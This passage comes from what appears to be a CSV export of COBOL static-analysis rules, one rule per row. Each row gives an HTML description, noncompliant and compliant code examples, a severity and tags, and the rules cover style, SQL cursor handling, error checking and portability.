instruction encountered by the program is very difficult, if not impossible.</p>
<p>If you need to change the processing sequence due to a certain condition, use <code>PERFORM</code> or <code>GO TO</code> instead.</p>","""ALTER"" should not be used",[],BLOCKER,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>You should avoid opening a cursor inside a <code>PERFORM</code> statement because doing so could impact performance, or lead to unexpected behavior
if the the closing of the cursor is not defined in the same loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  PERFORM UNTIL (NOT DA-OK) OR (Y00CIA-CD-RET-PGM = ZERO)
    EXEC SQL OPEN C2
    END-EXEC
  END-PERFORM.
</pre>",cobol:SQL.CursorOpenedInsideLoopCheck,cobol,COBOL,"<p>You should avoid opening a cursor inside a <code>PERFORM</code> statement because doing so could impact performance, or lead to unexpected behavior
if the the closing of the cursor is not defined in the same loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  PERFORM UNTIL (NOT DA-OK) OR (Y00CIA-CD-RET-PGM = ZERO)
    EXEC SQL OPEN C2
    END-EXEC
  END-PERFORM.
</pre>",Cursors should not be opened inside loops,[],CRITICAL,"['leak', 'performance', 'sql']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The <code>EVALUATE</code> statement allows implementing case structures in Cobol. Each case is managed by a <code>WHEN</code> phrase activated by
specific test of a variable.The <code>WHEN OTHER</code> phrase allows managing all the cases which have not been taken into account by the previous
<code>WHEN</code> phrases. If the variable to be tested contains a new value that is not currently managed then the absence of the <code>WHEN
OTHER</code> phrase will lead a situation in which no process will be performed for this value and the program may have uncontrolled or undefined
behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
       A010-PRINCIPAL.
         EVALUATE  Y5FTAR-PER-ECN-CTS
           WHEN '01'
             MOVE 'A' TO WS-CD-PER-CTS
           WHEN '02'
             MOVE 'S' TO WS-CD-PER-CTS
           WHEN '04'
             MOVE 'T' TO WS-CD-PER-CTS
           WHEN '12'
             MOVE 'M' TO WS-CD-PER-CTS
         END-EVALUATE.
</pre>
<h2>Compliant Solution</h2>
<pre>
       A010-PRINCIPAL.
         EVALUATE  Y5FTAR-PER-ECN-CTS
           WHEN '01'
             MOVE 'A' TO WS-CD-PER-CTS
           WHEN '02'
             MOVE 'S' TO WS-CD-PER-CTS
           WHEN '04'
             MOVE 'T' TO WS-CD-PER-CTS
           WHEN '12'
             MOVE 'M' TO WS-CD-PER-CTS
           WHEN OTHERS
             MOVE 'O' TO WS-CD-PER-CTS
         END-EVALUATE.
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>",cobol:COBOL.EvaluateStatementUsageCheck,cobol,COBOL,"<p>The <code>EVALUATE</code> statement allows implementing case structures in Cobol. Each case is managed by a <code>WHEN</code> phrase activated by
specific test of a variable.The <code>WHEN OTHER</code> phrase allows managing all the cases which have not been taken into account by the previous
<code>WHEN</code> phrases. If the variable to be tested contains a new value that is not currently managed then the absence of the <code>WHEN
OTHER</code> phrase will lead a situation in which no process will be performed for this value and the program may have uncontrolled or undefined
behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
       A010-PRINCIPAL.
         EVALUATE  Y5FTAR-PER-ECN-CTS
           WHEN '01'
             MOVE 'A' TO WS-CD-PER-CTS
           WHEN '02'
             MOVE 'S' TO WS-CD-PER-CTS
           WHEN '04'
             MOVE 'T' TO WS-CD-PER-CTS
           WHEN '12'
             MOVE 'M' TO WS-CD-PER-CTS
         END-EVALUATE.
</pre>
<h2>Compliant Solution</h2>
<pre>
       A010-PRINCIPAL.
         EVALUATE  Y5FTAR-PER-ECN-CTS
           WHEN '01'
             MOVE 'A' TO WS-CD-PER-CTS
           WHEN '02'
             MOVE 'S' TO WS-CD-PER-CTS
           WHEN '04'
             MOVE 'T' TO WS-CD-PER-CTS
           WHEN '12'
             MOVE 'M' TO WS-CD-PER-CTS
           WHEN OTHERS
             MOVE 'O' TO WS-CD-PER-CTS
         END-EVALUATE.
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>","""EVALUATE"" structures should end with ""WHEN OTHERS"" clauses",[],CRITICAL,"['cert', 'cwe', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Paragraphs, sections and statements must be correctly indented for better code readability. </p>
<h2>Noncompliant Code Example</h2>
<pre>
       IDENTIFICATION DIVISION.
       PROGRAM-ID. foo.

       PROCEDURE DIVISION.
           IF ""foo"" = ""bar"" THEN
           DISPLAY ""foo = bar!""      *&gt; Noncompliant
           ELSE
           DISPLAY ""foo &lt;&gt; bar!"".      *&gt; Noncompliant
       END PROGRAM foo.
</pre>
<h2>Compliant Solution</h2>
<pre>
       IDENTIFICATION DIVISION.
       PROGRAM-ID. foo.

       PROCEDURE DIVISION.
           IF ""foo"" = ""bar"" THEN
              DISPLAY ""foo = bar!""
           ELSE
              DISPLAY ""foo &lt;&gt; bar!"".
       END PROGRAM foo.
</pre>",cobol:COBOL.IdentationCheck,cobol,COBOL,"<p>Paragraphs, sections and statements must be correctly indented for better code readability. </p>
<h2>Noncompliant Code Example</h2>
<pre>
       IDENTIFICATION DIVISION.
       PROGRAM-ID. foo.

       PROCEDURE DIVISION.
           IF ""foo"" = ""bar"" THEN
           DISPLAY ""foo = bar!""      *&gt; Noncompliant
           ELSE
           DISPLAY ""foo &lt;&gt; bar!"".      *&gt; Noncompliant
       END PROGRAM foo.
</pre>
<h2>Compliant Solution</h2>
<pre>
       IDENTIFICATION DIVISION.
       PROGRAM-ID. foo.

       PROCEDURE DIVISION.
           IF ""foo"" = ""bar"" THEN
              DISPLAY ""foo = bar!""
           ELSE
              DISPLAY ""foo &lt;&gt; bar!"".
       END PROGRAM foo.
</pre>",Paragraphs and statements should be indented consistently,"[{'key': 'topLevelStatementColumn', 'htmlDesc': 'Position, relative to the indicator area, on which top level statements are expected', 'defaultValue': '5', 'type': 'INTEGER'}, {'key': 'indentationLevel', 'htmlDesc': 'Indentation level increment when statements are nested', 'defaultValue': '3', 'type': 'INTEGER'}, {'key': 'paragraphAndSectionColumn', 'htmlDesc': 'Position, relative to the indicator area, on which paragraphs and sections are expected', 'defaultValue': '1', 'type': 'INTEGER'}]",MINOR,['style'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Having <code>SECTION</code>s can lead to having paragraphs with the same name (one in each section), which could become confusing.</p>",cobol:COBOL.SectionUsageCheck,cobol,COBOL,"<p>Having <code>SECTION</code>s can lead to having paragraphs with the same name (one in each section), which could become confusing.</p>","""SECTION"" should not be used in a ""PROCEDURE DIVISION""",[],CRITICAL,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>In a <code>PERFORM prodecure1 THRU procedure2</code> statement, the two procedures should share a naming convention because they are strongly
related and there should be a way to quickly see this relationship while reading the source code. Otherwise, the source code might quickly become very
complex to maintain. To this end, procedure2 should contain the name of procedure1 and either a prefix or a suffix. For instance: <code>PERFORM
my-paragraph THRU end-my-paragraph</code>.</p>",cobol:COBOL.PerformThruProcedureNamingConventionCheck,cobol,COBOL,"<p>In a <code>PERFORM prodecure1 THRU procedure2</code> statement, the two procedures should share a naming convention because they are strongly
related and there should be a way to quickly see this relationship while reading the source code. Otherwise, the source code might quickly become very
complex to maintain. To this end, procedure2 should contain the name of procedure1 and either a prefix or a suffix. For instance: <code>PERFORM
my-paragraph THRU end-my-paragraph</code>.</p>","Procedures used in ""PERFORM ... THRU ..."" should share a naming convention","[{'key': 'prefix', 'htmlDesc': 'The prefix that must be added to the procedure2 name, e.g. &quot;END-&quot;', 'type': 'STRING'}, {'key': 'suffix', 'htmlDesc': 'The suffix that must be added to the procedure2 name, e.g. &quot;-END&quot;', 'type': 'STRING'}]",MAJOR,['convention'],CODE_SMELL
2017-04-11T12:32:43+0200,"<p>After the execution of each SQL statement (other than <code>DECLARE CURSOR</code>, <code>DECLARE TABLE</code> and <code>DECLARE VARIABLE</code>),
the value of <code>SQLCODE</code> or <code>SQLSTATE</code> should be checked before proceeding. A 0 <code>SQLCODE</code> value means the statement
succeeded, a positive value means success with a warning, and a negative value indicates an error. Proceeding without checking could put your program
or your data in a bad state.</p>
<h2>Noncompliant Code Example</h2>
<pre>
EXEC SQL
  SELECT name INTO :username FROM user WHERE id = :userid
END-EXEC.

DISPLAY username.    *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
EXEC SQL
  SELECT name INTO :username FROM user WHERE id = :userid
END-EXEC.

IF SQLCODE = 0 THEN
  DISPLAY username
END-IF.
</pre>
<h2>Exceptions</h2>
<p>When the value of <code>SQLCODE</code> or <code>SQLSTATE</code> is not checked but transferred to another variable for later use, no issue is
raised.</p>
<pre>
EXEC SQL
  SELECT name INTO :username FROM user WHERE id = :userid
END-EXEC.
MOVE SQLCODE TO SQL-RETURN-CODE
</pre>",cobol:S3890,cobol,COBOL,"<p>After the execution of each SQL statement (other than <code>DECLARE CURSOR</code>, <code>DECLARE TABLE</code> and <code>DECLARE VARIABLE</code>),
the value of <code>SQLCODE</code> or <code>SQLSTATE</code> should be checked before proceeding. A 0 <code>SQLCODE</code> value means the statement
succeeded, a positive value means success with a warning, and a negative value indicates an error. Proceeding without checking could put your program
or your data in a bad state.</p>
<h2>Noncompliant Code Example</h2>
<pre>
EXEC SQL
  SELECT name INTO :username FROM user WHERE id = :userid
END-EXEC.

DISPLAY username.    *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
EXEC SQL
  SELECT name INTO :username FROM user WHERE id = :userid
END-EXEC.

IF SQLCODE = 0 THEN
  DISPLAY username
END-IF.
</pre>
<h2>Exceptions</h2>
<p>When the value of <code>SQLCODE</code> or <code>SQLSTATE</code> is not checked but transferred to another variable for later use, no issue is
raised.</p>
<pre>
EXEC SQL
  SELECT name INTO :username FROM user WHERE id = :userid
END-EXEC.
MOVE SQLCODE TO SQL-RETURN-CODE
</pre>","""SQLCODE"" or ""SQLSTATE"" should be tested after each SQL statement",[],MINOR,"['error-handling', 'sql']",CODE_SMELL
2015-06-21T07:12:57+0200,"<p><code>UPDATE</code> and <code>DELETE</code> statements should contain <code>WHERE</code> clauses to keep the modification of records under control.
Otherwise unexpected data loss could result.</p>",cobol:S1590,cobol,COBOL,"<p><code>UPDATE</code> and <code>DELETE</code> statements should contain <code>WHERE</code> clauses to keep the modification of records under control.
Otherwise unexpected data loss could result.</p>","""DELETE"" and ""UPDATE"" statements should contain ""WHERE"" clauses",[],BLOCKER,['sql'],BUG
2013-06-19T07:34:52+0200,"<p>Sections should be used instead of paragraphs. Sections have better defined scopes for returning to the caller. Paragraphs have more flexible flow
control but this flexibility incurs additional risk.</p>",cobol:COBOL.ParagraphUsageCheck,cobol,COBOL,"<p>Sections should be used instead of paragraphs. Sections have better defined scopes for returning to the caller. Paragraphs have more flexible flow
control but this flexibility incurs additional risk.</p>",Paragraphs should not be used,[],MAJOR,['pitfall'],CODE_SMELL
2014-01-31T10:12:05+0100,"<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
       PROCEDURE DIVISION.

       DISPLAY ""Firstname: "".
      *...
       DISPLAY ""Firstname: "".
      *...
       DISPLAY ""Firstname: "".
</pre>
<h2>Compliant Solution</h2>
<pre>
       WORKING-STORAGE SECTION.
         01 FIRST-NAME-HEADER PIC X(42) VALUE ""Firstname: "".
       PROCEDURE DIVISION.

       DISPLAY FIRST-NAME-HEADER
      *...
       DISPLAY FIRST-NAME-HEADER
      *...
       DISPLAY FIRST-NAME-HEADER
</pre>
<h2>Exceptions</h2>
<p>Literals with fewer than 7 characters are ignored.</p>
<p>Only duplications located in a <code>PROCEDURE DIVISION</code>, not those contained in copybooks are reported.</p>",cobol:S1192,cobol,COBOL,"<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
       PROCEDURE DIVISION.

       DISPLAY ""Firstname: "".
      *...
       DISPLAY ""Firstname: "".
      *...
       DISPLAY ""Firstname: "".
</pre>
<h2>Compliant Solution</h2>
<pre>
       WORKING-STORAGE SECTION.
         01 FIRST-NAME-HEADER PIC X(42) VALUE ""Firstname: "".
       PROCEDURE DIVISION.

       DISPLAY FIRST-NAME-HEADER
      *...
       DISPLAY FIRST-NAME-HEADER
      *...
       DISPLAY FIRST-NAME-HEADER
</pre>
<h2>Exceptions</h2>
<p>Literals with fewer than 7 characters are ignored.</p>
<p>Only duplications located in a <code>PROCEDURE DIVISION</code>, not those contained in copybooks are reported.</p>",String literals should not be duplicated,"[{'key': 'threshold', 'htmlDesc': 'Number of times a literals must be duplicated to trigger an issue', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['design'],CODE_SMELL
2013-06-19T07:34:52+0200,<p>You should avoid using the <code>SORT</code> statement because it is inefficient. Use external tools to sort large numbers of records instead.</p>,cobol:COBOL.SortStatementUsageCheck,cobol,COBOL,<p>You should avoid using the <code>SORT</code> statement because it is inefficient. Use external tools to sort large numbers of records instead.</p>,"""SORT"" should not be used",[],MAJOR,['performance'],CODE_SMELL
2017-04-11T12:32:43+0200,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of arithmetic operators, having the same value on both
sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
* always true
  IF X = X
    PERFORM SECTION1.
  END-IF.

* always false
  IF X &lt;&gt; X
    PERFORM SECTION2.
  END-IF.

* if the first one is true, the second one is too
  IF X = Y AND X = Y
    PERFORM SECTION3.
  END-IF.

* if the first one is true, the second one is too
  IF X = Y OR X = Y
    PERFORM SECTION4.
  END-IF.

* always 1
  COMPUTE X = Y / Y.

* always 0
  COMPUTE X = Y - Y.
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code> and <code>+</code>. </p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=cobol%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>",cobol:S1764,cobol,COBOL,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of arithmetic operators, having the same value on both
sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
* always true
  IF X = X
    PERFORM SECTION1.
  END-IF.

* always false
  IF X &lt;&gt; X
    PERFORM SECTION2.
  END-IF.

* if the first one is true, the second one is too
  IF X = Y AND X = Y
    PERFORM SECTION3.
  END-IF.

* if the first one is true, the second one is too
  IF X = Y OR X = Y
    PERFORM SECTION4.
  END-IF.

* always 1
  COMPUTE X = Y / Y.

* always 0
  COMPUTE X = Y - Y.
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code> and <code>+</code>. </p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> {rule:cobol:S1656} - Implements a check on <code>=</code>. </li>
</ul>",Identical expressions should not be used on both sides of a binary operator,[],MAJOR,['cert'],BUG
2013-06-19T07:34:52+0200,"<p>The way computational fields are managed varies greatly between platforms, so for portability reasons they should not be used. The
<code>COMP-5</code> type is the only exception.</p>",cobol:COBOL.COMPUsageCheck,cobol,COBOL,"<p>The way computational fields are managed varies greatly between platforms, so for portability reasons they should not be used. The
<code>COMP-5</code> type is the only exception.</p>","The ""COMPUTATIONAL"" data value clause should not be used",[],MAJOR,['lock-in'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loops, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>",cobol:COBOL.MagicNumberCheck,cobol,COBOL,"<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loops, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>",Magic numbers should not be used,"[{'key': 'exclusionPatterns', 'htmlDesc': 'Comma separated list of exclusion XPath queries. For example .[@tokenValue<h1>&quot;0&quot;] to make the 0 literal an exception, or .[@tokenValue = &quot;100&quot;] and prevLeaf()[@tokenValue = &quot;DIVIDE&quot;] to make divisions by 100 an exception</h1>', 'type': 'TEXT'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>You should avoid closing a <code>CURSOR</code> inside a <code>PERFORM</code> statement, because it could impact performance or lead to unexpected
behavior if the cursor was not opened in the same loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 PERFORM UNTIL (NOT DA-OK)
       OR (Y00CIA-CD-RET-PGM = ZERO)
    EXEC SQL CLOSE C2
    END-EXEC
  END-PERFORM.
</pre>",cobol:SQL.CursorClosedInsideLoopCheck,cobol,COBOL,"<p>You should avoid closing a <code>CURSOR</code> inside a <code>PERFORM</code> statement, because it could impact performance or lead to unexpected
behavior if the cursor was not opened in the same loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 PERFORM UNTIL (NOT DA-OK)
       OR (Y00CIA-CD-RET-PGM = ZERO)
    EXEC SQL CLOSE C2
    END-EXEC
  END-PERFORM.
</pre>",Cursors should not be closed inside loops,[],CRITICAL,"['performance', 'pitfall', 'sql']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The COBOL <code>EXAMINE</code> statement is a specific OS/VS extension to the ANSI COBOL standard. To prevent portability issues, it should not be
used anymore.</p>",cobol:COBOL.ExamineStatementUsageCheck,cobol,COBOL,"<p>The COBOL <code>EXAMINE</code> statement is a specific OS/VS extension to the ANSI COBOL standard. To prevent portability issues, it should not be
used anymore.</p>","""EXAMINE"" should not be used",[],MAJOR,['lock-in'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>A paragraph that grows too large tends to aggregate too many responsibilities. Such paragraphs inevitably become harder to understand and therefore
harder to maintain.</p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller paragraphs which focus on well-defined tasks. Those smaller paragraphs
will not only be easier to understand, but also probably easier to test.</p>",cobol:COBOL.ParagraphOrSectionLinesCheck,cobol,COBOL,"<p>A paragraph that grows too large tends to aggregate too many responsibilities. Such paragraphs inevitably become harder to understand and therefore
harder to maintain.</p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller paragraphs which focus on well-defined tasks. Those smaller paragraphs
will not only be easier to understand, but also probably easier to test.</p>",Paragraphs should not have too many lines of code,"[{'key': 'maximumLinesThreshold', 'htmlDesc': 'The maximum number of lines', 'defaultValue': '100', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that file-code names conform to a specified regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Given a pattern of <code>FC-.*</code>:</p>
<pre>
 INPUT-OUTPUT SECTION.
 FILE-CONTROL.

     SELECT Y27MVTS       ASSIGN  TO     S1        &gt;Noncompliant; S1 doesn't match ""FC-.*"" pattern
                          FILE STATUS IS S1.
</pre>
<h2>Compliant Solution</h2>
<pre>
 INPUT-OUTPUT SECTION.
 FILE-CONTROL.

     SELECT Y27MVTS     ASSIGN  TO     FC-S1     &gt;OK as FC-S1 matches ""FC-.*"" pattern
                          FILE STATUS IS FS-S1.
</pre>",cobol:COBOL.FileCodeNamingCheck,cobol,COBOL,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that file-code names conform to a specified regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Given a pattern of <code>FC-.*</code>:</p>
<pre>
 INPUT-OUTPUT SECTION.
 FILE-CONTROL.

     SELECT Y27MVTS       ASSIGN  TO     S1        &gt;Noncompliant; S1 doesn't match ""FC-.*"" pattern
                          FILE STATUS IS S1.
</pre>
<h2>Compliant Solution</h2>
<pre>
 INPUT-OUTPUT SECTION.
 FILE-CONTROL.

     SELECT Y27MVTS     ASSIGN  TO     FC-S1     &gt;OK as FC-S1 matches ""FC-.*"" pattern
                          FILE STATUS IS FS-S1.
</pre>",File-Codes should comply with a naming convention,"[{'key': 'regexPatternString', 'htmlDesc': 'A regular expression to specify the File-Code naming convention', 'defaultValue': '.*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The <code>LINKAGE</code> section describes data made available from another program through the CALL statement. The data structure defined in a
<code>LINKAGE</code> section should be located in a COPYBOOK. Otherwise, at runtime multiple COBOL programs may try to share data structures which are
not similar.</p>
<p>First level data items can also be defined in the main program as long as there are no structural pieces of information attached to this first
level like the length, the format, and so on.</p>
<p>This rule raises an issue only on the first invalid data item of a <code>LINKAGE</code> section.</p>
<h2>Noncompliant Code Example</h2>
<pre>
LINKAGE SECTION.

01 LK-DATA.  *&gt; Noncompliant
  05 LK-LENGTH     PIC S9(04) COMP.
   05 LK-VARIABLE  PIC X(08).
</pre>
<h2>Compliant Solution</h2>
<pre>
LINKAGE SECTION.

COPY MY_COPYBOOK.
</pre>
<p>or</p>
<pre>
LINKAGE SECTION.

01 LK-DATA.
  COPY MY_COPYBOOK.
</pre>",cobol:COBOL.LinkageSectionUsageCheck,cobol,COBOL,"<p>The <code>LINKAGE</code> section describes data made available from another program through the CALL statement. The data structure defined in a
<code>LINKAGE</code> section should be located in a COPYBOOK. Otherwise, at runtime multiple COBOL programs may try to share data structures which are
not similar.</p>
<p>First level data items can also be defined in the main program as long as there are no structural pieces of information attached to this first
level like the length, the format, and so on.</p>
<p>This rule raises an issue only on the first invalid data item of a <code>LINKAGE</code> section.</p>
<h2>Noncompliant Code Example</h2>
<pre>
LINKAGE SECTION.

01 LK-DATA.  *&gt; Noncompliant
  05 LK-LENGTH     PIC S9(04) COMP.
   05 LK-VARIABLE  PIC X(08).
</pre>
<h2>Compliant Solution</h2>
<pre>
LINKAGE SECTION.

COPY MY_COPYBOOK.
</pre>
<p>or</p>
<pre>
LINKAGE SECTION.

01 LK-DATA.
  COPY MY_COPYBOOK.
</pre>","Data used in a ""LINKAGE"" should be defined in a COPYBOOK",[],CRITICAL,['pitfall'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The cyclomatic complexity of a program should not exceed a defined threshold, otherwise it will be too complex. Complex code can perform poorly,
and will be difficult to understand and therefore to maintain.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",cobol:COBOL.ProgramComplexityCheck,cobol,COBOL,"<p>The cyclomatic complexity of a program should not exceed a defined threshold, otherwise it will be too complex. Complex code can perform poorly,
and will be difficult to understand and therefore to maintain.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",The cyclomatic complexity of a program should not be too high,"[{'key': 'maximumComplexityThreshold', 'htmlDesc': 'The maximum authorized complexity in a program', 'defaultValue': '100', 'type': 'INTEGER'}]",CRITICAL,[],CODE_SMELL
2014-07-25T08:22:45+0200,"<p>When the <code>FILE STATUS</code> is not specified on a file, any read operations on the file should handle the ""AT END"" or ""INVALID KEY""
conditions. </p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT MY_FILE
  ASSIGN TO 'foobar.txt'
  ORGANIZATION IS SEQUENTIAL.
...
READ MY_FILE
  NOT AT END PERFORM COMPUTE_LINE
END-READ.
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT MY_FILE
  ASSIGN TO 'foobar.txt'
  ORGANIZATION IS SEQUENTIAL.
...
READ MY_FILE
  NOT AT END PERFORM COMPUTE_LINE
  AT END MOVE 'Y' TO EOF-FLAG
END-READ.
</pre>",cobol:S1731,cobol,COBOL,"<p>When the <code>FILE STATUS</code> is not specified on a file, any read operations on the file should handle the ""AT END"" or ""INVALID KEY""
conditions. </p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT MY_FILE
  ASSIGN TO 'foobar.txt'
  ORGANIZATION IS SEQUENTIAL.
...
READ MY_FILE
  NOT AT END PERFORM COMPUTE_LINE
END-READ.
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT MY_FILE
  ASSIGN TO 'foobar.txt'
  ORGANIZATION IS SEQUENTIAL.
...
READ MY_FILE
  NOT AT END PERFORM COMPUTE_LINE
  AT END MOVE 'Y' TO EOF-FLAG
END-READ.
</pre>","""READ"" statements should have an ""AT END"" or an ""INVALID KEY"" clause if ""FILE-STATUS"" is not defined",[],MAJOR,['suspicious'],CODE_SMELL
2016-12-09T10:13:20+0100,"<p>Queries with contradictory <code>WHERE</code> clauses will always return empty result sets. This is clearly a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT *
FROM fruit
WHERE type='apple' AND type='orange'  -- Noncompliant
</pre>",cobol:S3633,cobol,COBOL,"<p>Queries with contradictory <code>WHERE</code> clauses will always return empty result sets. This is clearly a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT *
FROM fruit
WHERE type='apple' AND type='orange'  -- Noncompliant
</pre>","""WHERE"" clause conditions should not be contradictory",[],MAJOR,['sql'],BUG
2016-12-09T10:13:20+0100,"<p>To ensure future code portability, obsolete keywords should not be used. The following keywords were declared obsolete in the COBOL ANSI-85
standard and removed in the ISO/IEC 1989:2002 standard: </p>
<ul>
  <li> Paragraphs: <code>AUTHOR</code>, <code>INSTALLATION</code>, <code>DATE-WRITTEN</code>, <code>DATE-COMPILED</code>, <code>SECURITY</code> </li>
  <li> Clauses: <code>DATA RECORD(S)</code>, <code>LABEL RECORD(S)</code>, <code>MEMORY SIZE</code>, <code>MULTIPLE FILE (TAPE)</code>,
  <code>RERUN</code>, <code>VALUE OF</code>, <code>CODE SEGMENT-LIMIT</code> </li>
  <li> Statements: <code>ALTER</code>, <code>ENTER</code>, <code>STOP</code> <em>literal</em>, <code>GO TO</code> without an argument </li>
  <li> Phrases: <code>REVERSED</code> phrase of the <code>OPEN</code> statement </li>
  <li> Special registers: <code>DEBUG-ITEM</code> </li>
  <li> Sections: Debugging sections </li>
  <li> Declarative: <code>USE FOR DEBUGGING</code> </li>
</ul>
<p>The following keywords were declared obsolete in the ISO/IEC 1989:2002 standard:</p>
<ul>
  <li> Phrase: <code>DEBUGGING MODE</code> </li>
  <li> Clause: <code>PADDING CHARACTER</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
IDENTIFICATION DIVISION.
PROGRAM-ID.  AcceptAndDisplay.
AUTHOR.  Michael Coughlan.  *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
IDENTIFICATION DIVISION.
PROGRAM-ID.  AcceptAndDisplay.
</pre>",cobol:S2269,cobol,COBOL,"<p>To ensure future code portability, obsolete keywords should not be used. The following keywords were declared obsolete in the COBOL ANSI-85
standard and removed in the ISO/IEC 1989:2002 standard: </p>
<ul>
  <li> Paragraphs: <code>AUTHOR</code>, <code>INSTALLATION</code>, <code>DATE-WRITTEN</code>, <code>DATE-COMPILED</code>, <code>SECURITY</code> </li>
  <li> Clauses: <code>DATA RECORD(S)</code>, <code>LABEL RECORD(S)</code>, <code>MEMORY SIZE</code>, <code>MULTIPLE FILE (TAPE)</code>,
  <code>RERUN</code>, <code>VALUE OF</code>, <code>CODE SEGMENT-LIMIT</code> </li>
  <li> Statements: <code>ALTER</code>, <code>ENTER</code>, <code>STOP</code> <em>literal</em>, <code>GO TO</code> without an argument </li>
